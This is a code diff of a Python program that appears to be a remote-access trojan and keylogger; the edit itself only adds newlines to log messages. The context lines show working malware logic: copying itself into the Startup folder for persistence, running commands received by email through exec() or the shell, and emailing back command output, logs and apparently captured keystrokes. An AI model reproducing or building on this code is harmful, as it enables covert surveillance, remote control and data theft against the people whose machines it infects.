@@ -120,7 +120,7 @@ def take_screenshot():
 
 def make_persistent():
     '''Adds program to Startup Files, making it persist after reboots.'''
-    logprint("INFO: Attempting to become persistent...")
+    logprint("INFO: Attempting to become persistent...\n")
     current_file_path = "{}/{}".format(getcwd().replace('\\',
                                        '/'), __file__)
     new_file_path = "{}/{}".format(path.expanduser('~').replace(
@@ -129,11 +129,11 @@ def make_persistent():
         command_output = check_output(
             f"cp {current_file_path} {new_file_path}")
     except:
-        logprint("ERROR: cp command failed, see output below.")
+        logprint("ERROR: cp command failed, see output below.\n")
         logprint(command_output)
-        logprint("Warning: Persistence operation failed.")
+        logprint("Warning: Persistence operation failed.\n")
     else:
-        logprint("INFO: Successfully made program persistent")
+        logprint("INFO: Successfully made program persistent\n")
 
 
 def run_command_order(email_body):
@@ -146,26 +146,26 @@ def run_command_order(email_body):
     command_order = command_order.replace(
         '"', '').replace("=3D", "=").split(",")
 
-    logprint(f"INFO: Command order is as follows, parsing:{command_order}")
+    logprint(f"INFO: Command order is as follows, parsing:{command_order}\n")
     if command_order[0] == "script":
-        logprint("INFO: Detected local command, running accordingly")
+        logprint("INFO: Detected local command, running accordingly\n")
         results = str(exec(f"{command_order[1]}"))
     elif command_order[0] == "os":
-        logprint("INFO: Detected global command, running accordingly")
+        logprint("INFO: Detected global command, running accordingly\n")
         results = check_output(command_order[1].split()).decode(
             'utf-8', errors="backslashreplace")
 
-    logprint("INFO: Ran given command, sending output.")
+    logprint("INFO: Ran given command, sending output.\n")
     send_results(
-        message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")
+        message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}\n")
 
 
 def send_results(message_text="", file_paths=None, subject=f"Report from {ID}"):
-    print("INFO: Running sending check...")
+    print("INFO: Running sending check...\n")
     global log, typed_string
     if log != "" or message_text != "":
-        logprint("INFO: New logs detected.")
-        logprint("INFO: Generating e-mail report...")
+        logprint("INFO: New logs detected.\n")
+        logprint("INFO: Generating e-mail report...\n")
 
         msg = MIMEMultipart()
         msg['From'] = SENDER
